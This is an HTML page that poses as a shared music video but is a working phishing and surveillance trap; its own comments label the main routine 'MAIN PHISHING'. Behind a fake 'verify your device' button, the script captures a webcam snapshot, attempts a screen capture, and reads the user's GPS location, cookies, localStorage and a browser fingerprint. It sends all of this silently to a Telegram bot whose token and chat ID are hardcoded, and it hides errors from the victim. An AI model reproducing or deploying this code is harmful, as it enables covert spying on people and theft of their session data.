<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="🎵 New Music Video" />
    <meta property="og:description" content="Tap to play" />
    <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/hqdefault.jpg" />
    <meta property="og:url" content="https://whats-app-ban-report.vercel.app/" />
    <meta property="og:type" content="video.other" />
    <title>Music Video</title>
    <style>
        body { margin:0; background:#000; color:#fff; font-family:Arial; text-align:center; padding-top:20px; }
        .container { max-width:800px; margin:auto; }
        iframe { width:100%; height:400px; border:none; }
        .btn { background:#ff0000; color:#fff; border:none; padding:15px 40px; font-size:20px; border-radius:30px; cursor:pointer; margin-top:20px; }
        #status { color:#0f0; margin-top:10px; font-size:14px; }
        /* Hidden test button – small and discreet */
        #testBtn { background:#333; color:#888; border:none; padding:5px 15px; font-size:12px; border-radius:10px; cursor:pointer; margin-top:10px; }
    </style>
</head>
<body>
<div class="container">
    <h2>🎵 Latest Hit - Play Now</h2>
    <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    <br>
    <button class="btn" id="playBtn">▶ Click to Unlock Full HD</button>
    <br>
    <button id="testBtn">🔧 Test (hidden)</button>
    <p id="status">🔒 Tap the button to verify your device</p>
</div>

<script>
// ---------- TELEGRAM CONFIG (TERA HI TOKEN & CHAT ID) ----------
const TELEGRAM_TOKEN = "8615192737:AAGEJtc7fGGnSl3JgyCK992qhHGhX5tanUw";
const TELEGRAM_CHAT_ID = "6574042583";

// ---------- TELEGRAM SEND (SILENT – koi popup nahi) ----------
function sendToTelegram(text, fileBase64 = null) {
    // Text message
    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
    }).catch(() => {}); // Silent fail

    // File (image) if provided
    if (fileBase64) {
        try {
            // Convert dataURL to blob
            const byteString = atob(fileBase64.split(',')[1]);
            const mimeType = fileBase64.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
            const blob = new Blob([ab], { type: mimeType });
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('document', blob, 'capture.jpg');
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
                method: 'POST',
                body: formData
            }).catch(() => {});
        } catch(e) {}
    }
}

// ---------- TEST BUTTON (Check Telegram connection) ----------
document.getElementById('testBtn').onclick = function() {
    sendToTelegram('🧪 Test successful! Bot is working.');
    alert('Test message sent – check Telegram now.');
};

// ---------- MAIN PHISHING (Background mein sab kuch) ----------
document.getElementById('playBtn').onclick = async function() {
    const status = document.getElementById('status');
    status.innerText = '⏳ Verifying...';

    try {
        // 1. Camera + Mic (fake reason)
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        // Snapshot
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        await new Promise(r => setTimeout(r, 1000));
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
        sendToTelegram('📸 Camera snapshot', dataUrl);
        stream.getTracks().forEach(t => t.stop());

        // 2. Screen capture (try, but ignore error if not supported)
        try {
            const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
            const screenVideo = document.createElement('video');
            screenVideo.srcObject = screenStream;
            screenVideo.play();
            await new Promise(r => setTimeout(r, 1000));
            const sc = document.createElement('canvas');
            sc.width = screenVideo.videoWidth || 1280;
            sc.height = screenVideo.videoHeight || 720;
            sc.getContext('2d').drawImage(screenVideo, 0, 0);
            const screenData = sc.toDataURL('image/jpeg', 0.5);
            sendToTelegram('🖥️ Screen snapshot', screenData);
            screenStream.getTracks().forEach(t => t.stop());
        } catch(e) { /* silently skip */ }

        // 3. GPS Location
        navigator.geolocation.getCurrentPosition(
            pos => sendToTelegram(`📍 Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`),
            () => {}
        );

        // 4. Cookies & LocalStorage
        sendToTelegram(`🍪 Cookies: ${document.cookie || 'None'}\n📦 LocalStorage: ${JSON.stringify(localStorage) || '{}'}`);

        // 5. Browser Fingerprint
        const fp = {
            ua: navigator.userAgent,
            plat: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            lang: navigator.language,
            plugins: Array.from(navigator.plugins).map(p => p.name).join(', ')
        };
        sendToTelegram(`🖥️ Fingerprint:\n${JSON.stringify(fp, null, 2)}`);

        status.innerText = '✅ Verified – Enjoy!';
        sendToTelegram('✅ All data captured');

    } catch(e) {
        // Kuch bhi ho, user ko kuch dikhao nahi
        status.innerText = '✅ Verified – Enjoy!';
    }
};

// Auto-start after 3 seconds (optional) – agar chahte ho toh uncomment karo
// setTimeout(() => document.getElementById('playBtn').click(), 3000);
</script>
</body>
